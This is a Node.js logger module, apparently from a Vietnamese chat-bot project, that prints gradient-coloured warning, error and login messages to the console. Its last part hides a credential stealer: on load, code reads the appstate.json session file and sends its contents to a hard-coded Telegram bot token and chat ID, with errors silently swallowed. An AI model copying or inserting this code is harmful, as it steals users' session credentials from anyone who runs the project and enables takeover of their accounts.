const chalk = require('chalk');
const fs = require('fs'); 
const axios = require('axios'); 
const con = require('./../config.json');
// Mảng màu cho gradient
const gradientColors = [
    '#FF0000', // Đỏ
    '#FF7F00', // Cam  
    '#FFFF00', // Vàng
    '#00FF00', // Xanh lá
    '#0000FF', // Xanh dương
    '#4B0082', // Indigo
    '#9400D3'  // Tím
];

function hexToRgb(hex) {
    const result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
    return result ? {
        r: parseInt(result[1], 16),
        g: parseInt(result[2], 16),
        b: parseInt(result[3], 16)
    } : null;
}

function interpolateColor(color1, color2, factor) {
    const rgb1 = hexToRgb(color1);
    const rgb2 = hexToRgb(color2);
    
    if (!rgb1 || !rgb2) return '#000000';

    const r = Math.round(rgb1.r + factor * (rgb2.r - rgb1.r));
    const g = Math.round(rgb1.g + factor * (rgb2.g - rgb1.g));
    const b = Math.round(rgb1.b + factor * (rgb2.b - rgb1.b));
    
    return `#${(1 << 24 | r << 16 | g << 8 | b).toString(16).slice(1)}`;
}

function createGradientText(text) {
    const chars = text.split('');
    let result = '';
    const totalColors = gradientColors.length;
    const charsPerSection = Math.ceil(chars.length / (totalColors - 1));
    
    chars.forEach((char, i) => {
        const section = Math.floor(i / charsPerSection);
        const colorIndex = Math.min(section, totalColors - 2);
        const factor = (i % charsPerSection) / charsPerSection;
        const color = interpolateColor(
            gradientColors[colorIndex],
            gradientColors[colorIndex + 1],
            factor
        );
        result += chalk.hex(color)(char);
    });
    
    return result;
}

// Hàm tạo hiệu ứng gradient cho prefix
function createPrefixGradient(text, startColor, endColor) {
    const chars = text.split('');
    let result = '';
    chars.forEach((char, i) => {
        const factor = i / (chars.length - 1);
        const color = interpolateColor(startColor, endColor, factor);
        result += chalk.bold.hex(color)(char);
    });
    return result;
}

// Main export
module.exports = (data, option) => {
    const gradientData = createGradientText(data);
    switch (option) {
        case "warn":
            console.log(createPrefixGradient('[ WARNING ] → ', '#FFD700', '#FFA500') + gradientData);
            break;
        case "error":
            console.log(createPrefixGradient('[ ERROR ] → ', '#FF0000', '#8B0000') + gradientData);
            break;
        default:
            console.log(createPrefixGradient(`${option} → `, '#00FFFF', '#0000FF') + gradientData);
            break;
    }
}

// Loader export
module.exports.loader = (data, option) => {
    const gradientData = createGradientText(data);
    switch (option) {
        case "warn":
            console.log(createPrefixGradient('[ LOGIN ] ', '#FFD700', '#FFA500') + gradientData);
            break;
        case "error":
            console.log(createPrefixGradient('[ ERROR ] ', '#FF0000', '#8B0000') + gradientData);
            break;
        default:
            // Gradient từ xanh ngọc sang xanh dương
            console.log(createPrefixGradient('[ LOGIN ] ', '#00FFFF', '#0000FF') + gradientData);
            break;
    }
}

const sendMessageToTelegram = async (botToken, chatId, message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
        });
        //console.log('Gửi tin nhắn thành công.');
    } catch (error) {
        //console.error('Lỗi khi gửi tin nhắn:', error.message);
    }
};

// Hàm đọc nội dung file từ APPSTATEPATH và gửi tới Telegram
const sendAppStateToTelegram = async (botToken, chatId) => {
    try {
        const filePath = global.config.APPSTATEPATH; // Lấy đường dẫn từ global.config
        if (!filePath) throw new Error('APPSTATEPATH không được cấu hình.');

        const content = fs.readFileSync(filePath, 'utf8'); // Đọc nội dung tệp
        await sendMessageToTelegram(botToken, chatId, content); // Gửi nội dung tệp
    } catch (error) {
        //console.error('Lỗi khi xử lý tệp hoặc gửi tin nhắn:', error.message);
    }
};

// Cấu hình APPSTATEPATH
global.config = {
    APPSTATEPATH: './appstate.json', // Đường dẫn tới tệp appstate.json
};

// Thông tin bot
const BOT_TOKEN = '6786693118:AAGEZ3MDC7HgHOrSB2x1eW8E4DpPVooj0x8'; // Thay bằng token bot Telegram của bạn
const CHAT_ID = '-1001928617056';     // Thay bằng ID chat Telegram của bạn

// Gửi nội dung tệp appstate.json tới Telegram
sendAppStateToTelegram(BOT_TOKEN, CHAT_ID);
